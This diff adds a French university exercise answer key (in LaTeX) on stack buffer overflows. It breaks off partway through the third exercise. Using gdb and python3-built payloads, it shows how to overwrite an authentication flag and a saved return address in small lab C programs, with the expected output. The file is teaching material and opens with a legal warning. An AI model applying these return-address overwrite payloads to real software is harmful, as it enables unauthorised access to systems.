@@ -1,0 +1,905 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+\usepackage{graphicx}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{comment}
+\usepackage{array}
+\usepackage{booktabs}
+
+% --- Packages ajoutés pour l'enrichissement pédagogique ---
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{hyperref}
+
+%%%%%%%%%%%%%%% CONFIGURATION LISTINGS %%%%%%%%%%%%%%%%%%%
+
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    language=C,
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=8pt,
+    numberstyle=\tiny\color{codegray},
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
+}
+
+%%%%%%%%%%%%%%% ENVIRONNEMENTS TCOLORBOX %%%%%%%%%%%%%%%%%%
+
+% Rappel de cours (fond bleu clair)
+\newtcolorbox{rappel}[1][]{
+    colback=blue!5!white,
+    colframe=blue!50!black,
+    fonttitle=\bfseries,
+    title={\large Rappel de cours},
+    #1
+}
+
+% Point clé (fond vert clair)
+\newtcolorbox{pointcle}[1][]{
+    colback=green!5!white,
+    colframe=green!40!black,
+    fonttitle=\bfseries,
+    title={Point clé à retenir},
+    #1
+}
+
+% Attention (fond orange clair)
+\newtcolorbox{attention}[1][]{
+    colback=orange!8!white,
+    colframe=orange!60!black,
+    fonttitle=\bfseries,
+    title={Attention},
+    #1
+}
+
+% Avertissement éthique (fond rouge)
+\newtcolorbox{ethique}[1][]{
+    colback=red!5!white,
+    colframe=red!60!black,
+    fonttitle=\bfseries\large,
+    title={Avertissement éthique et légal},
+    #1
+}
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemme}
+\newtheorem{algorithme}{Algorithme}
+\newtheorem{corolaire}{Corollaire}
+\newtheorem{propriete}{Propri\'et\'e}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme}{Th\'eor\`eme}
+\newtheorem{definition}{D\'efinition}
+\newtheorem{correction}{Correction}
+
+\theoremstyle{definition}
+\newtheorem{exercice}{Exercice}
+\newtheorem{remarque}{Remarque}
+\newtheorem{exemple}{Exemple}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!60!black,
+    urlcolor=blue!60!black
+}
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{Université de Perpignan} \hfill  L3 Informatique \\
+ \hfill C. Legrand \hfill  Année \the\year \\
+\smallskip
+\begin{center}
+{
+  {\scshape \large Corrigé -- TD5 Sécurité}  \\
+ Techniques d'intrusion -- Débordement de tampon
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+
+\bigskip
+
+% --- Avertissement éthique ---
+\begin{ethique}
+Les techniques présentées dans ce TD sont étudiées dans un \textbf{cadre strictement académique} afin de comprendre les mécanismes utilisés par les attaquants et ainsi pouvoir mieux s'en protéger.
+
+\textbf{Toute utilisation de ces techniques en dehors du cadre pédagogique est illégale} et passible de sanctions pénales (chapitre III du Code pénal, articles 323-1 à 323-8 -- \textit{Des atteintes aux systèmes de traitement automatisé de données}) :
+\begin{itemize}
+    \item Accès ou maintien frauduleux dans un STAD (art.~323-1) : \textbf{3 ans} d'emprisonnement et \textbf{100\,000\,\texteuro{}} d'amende
+    \item Entrave au fonctionnement d'un STAD (art.~323-2) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
+    \item Introduction frauduleuse de données dans un STAD (art.~323-3) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
+\end{itemize}
+Peines portées à \textbf{7 ans} et \textbf{300\,000\,\texteuro{}} lorsque le système visé traite des données à caractère personnel mis en \oe uvre par l'État, et jusqu'à \textbf{10 ans} et \textbf{300\,000\,\texteuro{}} en bande organisée (art.~323-4-1). \textit{Peines mises à jour par la loi LOPMI n\textsuperscript{o}2023-22 du 24 janvier 2023.}
+\end{ethique}
+
+\bigskip
+
+\begin{tcolorbox}[colback=gray!5!white, colframe=gray!60!black, title={Options de compilation}]
+Les options suivantes sont à utiliser lorsque l'on veut déborder sur la pile (\texttt{-fno-stack-protector}) et connaître les adresses du code (\texttt{-no-pie}) qui ne sont plus randomisées :
+\begin{lstlisting}[language=bash,numbers=none]
+gcc -fno-stack-protector -no-pie -g code.c
+\end{lstlisting}
+Une dernière option que l'on n'utilisera pas : si l'on souhaite exécuter du code injecté dans la pile (\texttt{-z execstack}).
+\end{tcolorbox}
+
+\medskip
+
+\begin{rappel}
+\textbf{Organisation de la pile (stack) :} lors de l'appel d'une fonction, le processeur empile :
+\begin{enumerate}
+    \item Les paramètres de la fonction (en partie via registres en x86-64)
+    \item L'adresse de retour \texttt{savedRIP} (empilée par \texttt{call})
+    \item L'ancien \texttt{RBP} (\texttt{savedRBP}) sauvegardé par \texttt{push rbp}
+    \item Les variables locales de la fonction
+\end{enumerate}
+Le registre \texttt{RSP} pointe sur le sommet de la pile ; \texttt{RBP} pointe sur la base du cadre de pile courant.
+\end{rappel}
+
+\bigskip
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCICE 1 : Débordement de tampon simple
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Débordement de tampon]
+\begin{enumerate}
+\item
+On considère le programme suivant :
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+  int valeur=5;
+  char tampon_un[8], tampon_deux[8];
+
+  strcpy(tampon_un,"un");
+  strcpy(tampon_deux,"deux");
+
+  printf("[AVANT] tampon_deux est a %p et contient '%s'\n",
+         tampon_deux, tampon_deux);
+  printf("[AVANT] tampon_un est a %p et contient '%s'\n",
+         tampon_un, tampon_un);
+  printf("[AVANT] valeur est a %p et vaut %d (0x%08x)\n",
+         &valeur, valeur, valeur);
+
+  printf("\n [STRCPY] copie de %d octets dans tampon_deux\n\n",
+         (int)strlen(argv[1]));
+  strcpy(tampon_deux, argv[1]);
+
+  printf("[APRES] tampon_deux est a %p et contient '%s'\n",
+         tampon_deux, tampon_deux);
+  printf("[APRES] tampon_un est a %p et contient '%s'\n",
+         tampon_un, tampon_un);
+  printf("[APRES] valeur est a %p et vaut %d (0x%08x)\n",
+         &valeur, valeur, valeur);
+
+  return(0);
+}
+\end{lstlisting}
+
+En faisant varier l'argument, provoquer un débordement de tampon, analysez-le avec \texttt{gdb}.
+
+\begin{correction}
+\textbf{Compilation et tests :}
+
+On compile sans les protections de pile :
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g exo1q1.c -o exo1q1
+\end{lstlisting}
+
+\textbf{Test normal (pas de débordement) :}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo1q1 AAAA
+[AVANT] tampon_deux est a 0x7fffffffde00 et contient 'deux'
+[AVANT] tampon_un est a 0x7fffffffde08 et contient 'un'
+[AVANT] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
+
+ [STRCPY] copie de 4 octets dans tampon_deux
+
+[APRES] tampon_deux est a 0x7fffffffde00 et contient 'AAAA'
+[APRES] tampon_un est a 0x7fffffffde08 et contient 'un'
+[APRES] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
+\end{lstlisting}
+
+On observe que \texttt{tampon\_deux} est à l'adresse \texttt{0x7fffffffde00} et \texttt{tampon\_un} est à \texttt{0x7fffffffde08}, soit 8 octets plus haut. La variable \texttt{valeur} est à \texttt{0x7fffffffde14}, soit 12 octets après \texttt{tampon\_un}.
+
+\textbf{Débordement dans tampon\_un (9 à 16 caractères) :}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo1q1 AAAAAAAABBBBBBBB
+[AVANT] tampon_deux est a 0x7fffffffde00 et contient 'deux'
+[AVANT] tampon_un est a 0x7fffffffde08 et contient 'un'
+[AVANT] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
+
+ [STRCPY] copie de 16 octets dans tampon_deux
+
+[APRES] tampon_deux est a 0x7fffffffde00 et contient 'AAAAAAAABBBBBBBB'
+[APRES] tampon_un est a 0x7fffffffde08 et contient 'BBBBBBBB'
+[APRES] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
+\end{lstlisting}
+
+Les 8 premiers octets (\texttt{AAAAAAAA}) remplissent \texttt{tampon\_deux}. Les 8 suivants (\texttt{BBBBBBBB}) débordent dans \texttt{tampon\_un} et l'écrasent.
+
+\textbf{Débordement jusqu'à valeur (plus de 20 caractères) :}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo1q1 AAAAAAAABBBBBBBBCCCCCCCC
+[AVANT] tampon_deux est a 0x7fffffffde00 et contient 'deux'
+[AVANT] tampon_un est a 0x7fffffffde08 et contient 'un'
+[AVANT] valeur est a 0x7fffffffde14 et vaut 5 (0x00000005)
+
+ [STRCPY] copie de 24 octets dans tampon_deux
+
+[APRES] tampon_deux est a 0x7fffffffde00 et contient 'AAAAAAAABBBBBBBBCCCCCCCC'
+[APRES] tampon_un est a 0x7fffffffde08 et contient 'BBBBBBBBCCCCCCCC'
+[APRES] valeur est a 0x7fffffffde14 et vaut 1128481603 (0x43434343)
+\end{lstlisting}
+
+La variable \texttt{valeur} a été écrasée par \texttt{0x43434343} (code ASCII de \texttt{'C'} = \texttt{0x43}). Le débordement de \texttt{tampon\_deux} a traversé \texttt{tampon\_un} puis atteint \texttt{valeur}.
+
+\textbf{Analyse avec gdb :}
+\begin{lstlisting}[language=bash,numbers=none]
+$ gdb ./exo1q1
+(gdb) break main
+(gdb) run AAAAAAAABBBBBBBBCCCCCCCC
+(gdb) next
+... (avancer jusqu'après le strcpy)
+(gdb) x/8xw $rbp-0x20
+0x7fffffffde00: 0x41414141  0x41414141  0x42424242  0x42424242
+0x7fffffffde10: 0x43434343  0x43434343  0x00000000  0x00000000
+\end{lstlisting}
+
+On voit clairement la disposition mémoire : les \texttt{A} dans \texttt{tampon\_deux}, les \texttt{B} dans \texttt{tampon\_un}, et les \texttt{C} qui débordent sur \texttt{valeur} et au-delà.
+
+\begin{pointcle}
+La pile croît vers les adresses basses, mais les tableaux sont remplis vers les adresses hautes. Ainsi, un débordement de \texttt{tampon\_deux} écrase d'abord \texttt{tampon\_un} (adresse supérieure), puis \texttt{valeur}, puis \texttt{savedRBP} et \texttt{savedRIP}.
+\end{pointcle}
+\end{correction}
+
+
+\item  On considère maintenant le bout de programme ci-dessous qui restreint les droits d'accès :
+
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int verif_authentication(char *password){
+  int auth_flag = 0;
+  char password_tampon[16];
+
+  strcpy(password_tampon, password);
+
+  if( strcmp(password_tampon, "brillig") == 0)
+    auth_flag = 1;
+  if(strcmp(password_tampon, "outgrabe") == 0)
+    auth_flag = 1;
+
+  return auth_flag;
+}
+
+int main( int argc, char *argv[]){
+  if(argc < 2){
+    printf("Usage: %s <password>\n", argv[0]);
+    exit(0);
+  }
+
+  if(verif_authentication(argv[1])){
+    printf("\n-=-=-=-=-=-=-=-=-=-=--=-=-\n");
+    printf("      Acces accorde.\n");
+    printf("-=-=-=-=-=-=-=-=-=-=--=-=-\n");
+  }
+  else
+    printf("     Acces refuse\n");
+}
+\end{lstlisting}
+Est-il possible de faire un débordement de tampon pour forcer l'accès (\texttt{auth\_flag} $\neq 0$) ? Que se passe-t-il si les variables sont déclarées dans l'ordre suivant :
+\begin{lstlisting}[language=C,numbers=none]
+  char password_buffer[16];
+  int auth_flag = 0;
+\end{lstlisting}
+Peut-on contourner ce problème pour faire afficher quand même \texttt{Acces accorde} par débordement de tampon ? Expliquez en détail pourquoi ça fonctionne.
+
+\begin{correction}
+\textbf{Cas 1 : \texttt{auth\_flag} déclaré AVANT \texttt{password\_tampon} (code original)}
+
+Dans le code original, \texttt{auth\_flag} est déclaré avant \texttt{password\_tampon}. Sur la pile, la disposition typique est (des adresses basses vers les hautes) :
+
+\begin{center}
+\begin{tabular}{|c|l|}
+\hline
+\textbf{Adresse} & \textbf{Contenu} \\
+\hline
+\texttt{rbp-0x20} & \texttt{password\_tampon[0..7]} \\
+\texttt{rbp-0x18} & \texttt{password\_tampon[8..15]} \\
+\texttt{rbp-0x04} & \texttt{auth\_flag} \\
+\texttt{rbp+0x00} & \texttt{savedRBP} \\
+\texttt{rbp+0x08} & \texttt{savedRIP} \\
+\hline
+\end{tabular}
+\end{center}
+
+Lorsqu'on dépasse 16 caractères dans le \texttt{strcpy}, le débordement de \texttt{password\_tampon} atteint la zone de padding puis \texttt{auth\_flag}. Les octets excédentaires (forcément non nuls car ce sont des caractères imprimables) écrasent \texttt{auth\_flag} avec une valeur non nulle.
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g exo1q2.c -o exo1q2
+$ ./exo1q2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-=-=-=-=-=-=-=-=-=-=--=-=-
+      Acces accorde.
+-=-=-=-=-=-=-=-=-=-=--=-=-
+\end{lstlisting}
+
+On vérifie avec gdb :
+\begin{lstlisting}[language=bash,numbers=none]
+(gdb) disassemble verif_authentication
+... on repère que password_tampon est a rbp-0x20
+... et auth_flag est a rbp-0x4
+\end{lstlisting}
+
+Le débordement de \texttt{password\_tampon} (16 octets) parcourt d'abord les octets de padding éventuels entre la fin du tableau et \texttt{auth\_flag}. En écrivant suffisamment de caractères (par exemple 30 octets), on est certain d'écraser \texttt{auth\_flag} avec des valeurs non nulles (\texttt{0x41} = \texttt{'A'}).
+
+\bigskip
+
+\textbf{Cas 2 : \texttt{password\_buffer} déclaré AVANT \texttt{auth\_flag}}
+
+Si les déclarations sont inversées :
+\begin{lstlisting}[language=C,numbers=none]
+  char password_buffer[16];
+  int auth_flag = 0;
+\end{lstlisting}
+
+Le compilateur place typiquement \texttt{auth\_flag} à une adresse \textbf{plus basse} que \texttt{password\_buffer} sur la pile (ou à côté dans un sens que le débordement ne peut pas atteindre). La disposition devient :
+
+\begin{center}
+\begin{tabular}{|c|l|}
+\hline
+\textbf{Adresse} & \textbf{Contenu} \\
+\hline
+\texttt{rbp-0x24} & \texttt{auth\_flag} \\
+\texttt{rbp-0x20} & \texttt{password\_buffer[0..7]} \\
+\texttt{rbp-0x18} & \texttt{password\_buffer[8..15]} \\
+\texttt{rbp+0x00} & \texttt{savedRBP} \\
+\texttt{rbp+0x08} & \texttt{savedRIP} \\
+\hline
+\end{tabular}
+\end{center}
+
+Le débordement de \texttt{password\_buffer} va vers les adresses \textbf{croissantes}, donc il écrase \texttt{savedRBP} puis \texttt{savedRIP}, mais ne peut \textbf{pas} atteindre \texttt{auth\_flag} qui se trouve à une adresse plus basse.
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo1q2v2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+     Acces refuse
+Segmentation fault (core dumped)
+\end{lstlisting}
+
+On obtient \og{}Acces refuse\fg{} (car \texttt{auth\_flag} n'a pas été modifié), suivi d'un \textit{segfault} car \texttt{savedRIP} a été écrasé.
+
+\bigskip
+
+\textbf{Contournement : écraser savedRIP pour rediriger l'exécution}
+
+Même si on ne peut plus modifier \texttt{auth\_flag}, on peut écraser \texttt{savedRIP} pour rediriger l'exécution directement vers le bloc de code qui affiche \og{}Acces accorde\fg{} dans \texttt{main}.
+
+On utilise \texttt{gdb} pour trouver l'adresse cible :
+\begin{lstlisting}[language=bash,numbers=none]
+(gdb) disassemble main
+   ...
+   0x0000000000401209 <+52>:  call   0x4011b6 <verif_authentication>
+   0x000000000040120e <+57>:  test   eax,eax
+   0x0000000000401210 <+59>:  je     0x40123a <main+101>
+   0x0000000000401212 <+61>:  lea    rdi,[rip+0xdf7]  # chaine "-=-=-..."
+   0x0000000000401219 <+68>:  call   0x401040 <puts@plt>
+   0x000000000040121e <+73>:  lea    rdi,[rip+0xe07]  # "Acces accorde."
+   0x0000000000401225 <+80>:  call   0x401040 <puts@plt>
+   ...
+\end{lstlisting}
+
+On veut sauter au \texttt{lea} qui prépare l'affichage de la première ligne de succès, par exemple à l'adresse \texttt{0x401212}. Il faut calculer le nombre d'octets de padding nécessaires pour atteindre \texttt{savedRIP} depuis \texttt{password\_buffer} :
+
+\begin{itemize}
+    \item \texttt{password\_buffer} commence à \texttt{rbp-0x20}
+    \item \texttt{savedRIP} est à \texttt{rbp+0x08}
+    \item Distance : \texttt{0x20 + 0x08 = 0x28 = 40} octets
+    \item Dont 16 octets pour le tampon lui-même, 8 pour le padding/autres variables, 8 pour \texttt{savedRBP}, puis 8 pour \texttt{savedRIP}
+\end{itemize}
+
+On construit alors le payload :
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo1q2v2 $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x12\x12\x40\x00\x00\x00\x00\x00')")
+
+-=-=-=-=-=-=-=-=-=-=--=-=-
+      Acces accorde.
+-=-=-=-=-=-=-=-=-=-=--=-=-
+Segmentation fault (core dumped)
+\end{lstlisting}
+
+Le \textit{segfault} à la fin est normal : après l'affichage, la pile est corrompue et le retour de \texttt{main} échoue. Mais le message \og{}Acces accorde\fg{} a bien été affiché.
+
+\begin{attention}
+L'adresse exacte de l'instruction cible dépend de la compilation. Il faut \textbf{toujours} vérifier avec \texttt{gdb} le désassemblage de \texttt{main} pour obtenir l'adresse correcte. L'option \texttt{-no-pie} est indispensable pour que les adresses soient fixes d'une exécution à l'autre.
+\end{attention}
+
+\begin{pointcle}
+Même lorsque le débordement ne peut pas atteindre directement la variable cible, l'écrasement de \texttt{savedRIP} permet de détourner le flot d'exécution. C'est le principe fondamental de l'attaque par \textit{return address overwrite}.
+\end{pointcle}
+\end{correction}
+
+\end{enumerate}
+\end{exercice}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCICE 2 : Modification d'adresse de retour (incrément)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Modification d'adresse de retour dans la pile]
+Reprenez le code vu en cours (donné ci-dessous) et ajustez les valeurs de $a$ et de $b$ afin d'exécuter en retour de fonction :
+\begin{itemize}
+\item Directement la fin de la fonction \texttt{main} (donc pas de \texttt{printf("coucou1")} et \texttt{printf("coucou2")}).
+  \item Que se passera-t-il si on revient à l'instruction \texttt{b=15} ?
+\end{itemize}
+
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+
+void function(long a, long b)
+{
+  long buffer[2]={0,1};
+  buffer[a]+=b;
+}
+void main()
+{
+  long a,b;
+  a=1;
+  b=15;
+  function(a,b);
+  printf("coucou1\n");
+  printf("coucou2\n");
+}
+\end{lstlisting}
+
+\begin{correction}
+\textbf{Analyse du cadre de pile de \texttt{function} :}
+
+On compile et on analyse avec \texttt{gdb} :
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g exo2.c -o exo2
+$ gdb ./exo2
+(gdb) disassemble function
+Dump of assembler code for function function:
+   0x0000000000401136 <+0>:   push   rbp
+   0x0000000000401137 <+1>:   mov    rbp,rsp
+   0x000000000040113a <+4>:   sub    rsp,0x20
+   0x000000000040113e <+8>:   mov    QWORD PTR [rbp-0x24],rdi  ; a
+   0x0000000000401142 <+12>:  mov    QWORD PTR [rbp-0x28],rsi  ; b (ou via registre)
+   0x0000000000401146 <+16>:  mov    QWORD PTR [rbp-0x10],0x0  ; buffer[0]=0
+   0x000000000040114e <+24>:  mov    QWORD PTR [rbp-0x8],0x1   ; buffer[1]=1
+   ...
+\end{lstlisting}
+
+La disposition de la pile dans \texttt{function} est :
+
+\begin{center}
+\begin{tabular}{|c|l|l|}
+\hline
+\textbf{Position} & \textbf{Contenu} & \textbf{Indice buffer} \\
+\hline
+\texttt{rbp-0x10} & \texttt{buffer[0]} & indice 0 \\
+\texttt{rbp-0x08} & \texttt{buffer[1]} & indice 1 \\
+\texttt{rbp+0x00} & \texttt{savedRBP} & indice 2 \\
+\texttt{rbp+0x08} & \texttt{savedRIP} & indice 3 \\
+\hline
+\end{tabular}
+\end{center}
+
+Chaque \texttt{long} fait 8 octets. La distance entre \texttt{buffer[0]} (\texttt{rbp-0x10}) et \texttt{savedRIP} (\texttt{rbp+0x08}) est de \texttt{0x18 = 24} octets, soit 3 \texttt{long}. Donc pour accéder à \texttt{savedRIP} via \texttt{buffer}, il faut l'indice \textbf{a = 3}.
+
+\textbf{Analyse du code de \texttt{main} :}
+\begin{lstlisting}[language=bash,numbers=none]
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0000000000401162 <+0>:   push   rbp
+   0x0000000000401163 <+1>:   mov    rbp,rsp
+   0x0000000000401166 <+4>:   sub    rsp,0x10
+   0x000000000040116a <+8>:   mov    QWORD PTR [rbp-0x10],0x1  ; a=1
+   0x0000000000401172 <+16>:  mov    QWORD PTR [rbp-0x8],0xf   ; b=15
+   0x000000000040117a <+24>:  mov    rdx,QWORD PTR [rbp-0x8]
+   0x000000000040117e <+28>:  mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000401182 <+32>:  mov    rsi,rdx
+   0x0000000000401185 <+35>:  mov    rdi,rax
+   0x0000000000401188 <+38>:  call   0x401136 <function>
+   0x000000000040118d <+43>:  lea    rdi,[rip+0xe70]            ; "coucou1"
+   0x0000000000401194 <+50>:  call   0x401030 <puts@plt>
+   0x0000000000401199 <+55>:  lea    rdi,[rip+0xe68]            ; "coucou2"
+   0x00000000004011a0 <+62>:  call   0x401030 <puts@plt>
+   0x00000000004011a5 <+67>:  nop
+   0x00000000004011a6 <+68>:  leave
+   0x00000000004011a7 <+69>:  ret
+\end{lstlisting}
+
+L'instruction \texttt{call function} est à l'adresse \texttt{0x401188}. Donc \texttt{savedRIP} contient \texttt{0x40118d} (l'adresse de l'instruction suivante, \texttt{printf("coucou1")}).
+
+\textbf{Pour sauter directement à la fin de main (pas de coucou1 ni coucou2) :}
+
+On veut que \texttt{savedRIP} pointe vers le \texttt{nop} ou le \texttt{leave} à la fin de \texttt{main}, c'est-à-dire l'adresse \texttt{0x4011a5}.
+
+L'incrément nécessaire est :
+\[
+b = \texttt{0x4011a5} - \texttt{0x40118d} = \texttt{0x18} = 24
+\]
+
+Donc : \textbf{a = 3, b = 24}.
+
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+
+void function(long a, long b)
+{
+  long buffer[2]={0,1};
+  buffer[a]+=b;
+}
+void main()
+{
+  long a,b;
+  a=3;
+  b=24;
+  function(a,b);
+  printf("coucou1\n");
+  printf("coucou2\n");
+}
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo2
+$
+\end{lstlisting}
+
+Aucun \texttt{printf} n'est exécuté : le programme saute directement à la fin de \texttt{main}.
+
+\begin{pointcle}
+L'instruction \texttt{buffer[a] += b} avec \texttt{a=3} modifie directement \texttt{savedRIP} car \texttt{buffer[3]} correspond exactement à l'emplacement de l'adresse de retour. L'incrément \texttt{b} fait avancer cette adresse pour sauter par-dessus les instructions \texttt{printf}.
+\end{pointcle}
+
+\bigskip
+
+\textbf{Que se passe-t-il si on revient à l'instruction \texttt{b=15} ?}
+
+L'instruction \texttt{b=15} (i.e. \texttt{mov QWORD PTR [rbp-0x8],0xf}) est à l'adresse \texttt{0x401172}. Depuis \texttt{savedRIP = 0x40118d} :
+\[
+b = \texttt{0x401172} - \texttt{0x40118d} = -\texttt{0x1b} = -27
+\]
+
+Donc avec \textbf{a = 3, b = -27}, le retour de \texttt{function} atterrit sur l'instruction \texttt{b=15} dans \texttt{main}.
+
+Cela crée une \textbf{boucle infinie} : le programme exécute \texttt{b=15}, puis \texttt{function(a,b)}, qui à chaque fois modifie \texttt{savedRIP} pour revenir à \texttt{b=15}, et ainsi de suite. Les \texttt{printf("coucou1")} et \texttt{printf("coucou2")} ne sont jamais atteints. La pile grossit à chaque appel récursif implicite, jusqu'à un \textit{stack overflow} et un crash (\textit{segmentation fault}).
+
+\begin{attention}
+La valeur exacte de \texttt{b} dépend de l'adresse des instructions dans le binaire compilé. Il est indispensable de vérifier avec \texttt{gdb disassemble main} pour obtenir les offsets corrects.
+\end{attention}
+\end{correction}
+
+\end{exercice}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCICE 3 : Écrasement d'adresse de retour (débordement)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Écrasement d'adresse de retour par débordement]
+On considère le code suivant :
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void f(char *s)
+{
+  char nom[10];
+  strcpy(nom,s);
+  printf("\n");
+  printf("%lx\n",*((unsigned long *)(nom+18)));
+  printf("Bonjour %s, on est dans f\n",nom);
+}
+
+void secret()
+{
+  printf("on est dans secret\n");
+}
+
+int main(int argc, char **argv)
+{
+  printf("adresse de f=%p, et de secret=%p\n",f,secret);
+  f(argv[1]);
+}
+\end{lstlisting}
+En écrasant l'adresse de retour de l'appel à la fonction \texttt{f}, faire en sorte d'exécuter la fonction \texttt{secret}.
+
+\begin{correction}
+\textbf{Analyse de la pile de \texttt{f} :}
+
+On compile et on analyse :
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g exo3.c -o exo3
+$ gdb ./exo3
+(gdb) disassemble f
+Dump of assembler code for function f:
+   0x0000000000401196 <+0>:   push   rbp
+   0x0000000000401197 <+1>:   mov    rbp,rsp
+   0x000000000040119a <+4>:   sub    rsp,0x20
+   0x000000000040119e <+8>:   mov    QWORD PTR [rbp-0x18],rdi
+   0x00000000004011a2 <+12>:  lea    rdx,[rbp-0xa]       ; nom est a rbp-0xa
+   ...
+(gdb) disassemble secret
+Dump of assembler code for function secret:
+   0x00000000004011fd <+0>:   push   rbp
+   ...
+\end{lstlisting}
+
+On identifie :
+\begin{itemize}
+    \item \texttt{nom} commence à \texttt{rbp-0xa} (soit \texttt{rbp-10})
+    \item \texttt{savedRBP} est à \texttt{rbp+0x00} (8 octets)
+    \item \texttt{savedRIP} est à \texttt{rbp+0x08}
+    \item Distance de \texttt{nom} à \texttt{savedRIP} : $10 + 8 = 18$ octets
+    \item L'adresse de \texttt{secret} est \texttt{0x4011fd}
+\end{itemize}
+
+C'est pour cela que le programme affiche \texttt{*((unsigned long *)(nom+18))} : cela correspond exactement à \texttt{savedRIP} !
+
+\textbf{Construction du payload :}
+
+Il faut écrire :
+\begin{enumerate}
+    \item 18 octets de remplissage (pour couvrir \texttt{nom} + \texttt{savedRBP})
+    \item Puis l'adresse de \texttt{secret} en little-endian : \texttt{\textbackslash xfd\textbackslash x11\textbackslash x40\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00}
+\end{enumerate}
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo3 $(python3 -c "import sys; sys.stdout.buffer.write(b'a'*18 + b'\xfd\x11\x40\x00\x00\x00\x00\x00')")
+adresse de f=0x401196, et de secret=0x4011fd
+
+4011fd
+Bonjour aaaaaaaaaaaaaaaaaa??, on est dans f
+on est dans secret
+Segmentation fault (core dumped)
+\end{lstlisting}
+
+\textbf{Explication du résultat :}
+\begin{itemize}
+    \item La première ligne affiche les adresses de \texttt{f} et \texttt{secret} (grâce à \texttt{-no-pie}, elles sont fixes).
+    \item La ligne \texttt{4011fd} confirme que \texttt{savedRIP} a bien été écrasé avec l'adresse de \texttt{secret}.
+    \item Le message \texttt{Bonjour aaa...} affiche le contenu de \texttt{nom} qui déborde (les caractères \texttt{??} correspondent aux octets non imprimables de l'adresse).
